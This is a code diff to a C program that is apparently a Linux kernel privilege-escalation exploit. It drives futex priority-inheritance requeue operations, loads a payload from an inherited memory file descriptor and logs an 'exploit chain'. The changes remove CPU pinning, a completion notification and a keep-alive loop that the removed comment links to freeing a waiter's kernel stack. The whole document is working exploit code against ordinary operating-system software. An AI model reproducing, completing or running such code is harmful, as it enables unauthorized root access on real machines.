@@ -187,7 +187,6 @@ static void *waiter_thread(void *arg __attribute__((unused))) {
 /* ------------------------------------------------------------------ */
 
 static void *owner_thread(void *arg __attribute__((unused))) {
-    pin_to_core(0);
     /* Lock pi_target first. */
     if (syscall(__NR_futex, &f_pi_target, FUTEX_LOCK_PI, 0,
                 NULL, NULL, 0) != 0) {
@@ -296,16 +295,13 @@ static void *consumer_thread(void *arg __attribute__((unused))) {
 int main(int argc, char **argv) {
     pr_info("[exp32-enter] phase=main-enter pid=%d argc=%d\n", getpid(), argc);
     if (argc < 2) {
-        pr_warning("usage: %s <buffer_fd> [notify_fd]\n", argv[0]);
+        pr_warning("usage: %s <buffer_fd>\n", argv[0]);
         return 1;
     }
-    pin_to_core(0);
 
     /* Read the payload from the inherited memfd (see exp_stack_once). */
     int buf_fd = atoi(argv[1]);
-    int notify_fd = argc >= 3 ? atoi(argv[2]) : -1;
-    pr_info("[exp32-enter] phase=before-pread pid=%d fd=%d notify=%d\n",
-            getpid(), buf_fd, notify_fd);
+    pr_info("[exp32-enter] phase=before-pread pid=%d fd=%d\n", getpid(), buf_fd);
     ssize_t n = pread(buf_fd, g_payload_buffer, EXP_BUFFER_BYTES, 0);
     if (n != EXP_BUFFER_BYTES) {
         pr_warning("buffer fd %d unreadable: pread=%zd errno=%d\n",
@@ -347,18 +343,10 @@ int main(int argc, char **argv) {
     pr_debug("main: CMP_REQUEUE_PI returned (errno=%d should be 35(EDEADLK))\n",
              errno);
 
-    /* Wait for the exploit chain to finish, then stay alive.  Returning
-     * here used to destroy the parked waiter and free its kernel stack. */
+    /* Wait for the exploit chain to finish (or crash). */
     while (!atomic_load(&g_consumer_done))
         sleep(1);
 
     pr_info("main: exploit chain complete.\n");
-    if (notify_fd >= 0) {
-        char ack = 'x';
-        (void)write(notify_fd, &ack, 1);
-        close(notify_fd);
-    }
-    for (;;)
-        pause();
     return 0;
 }
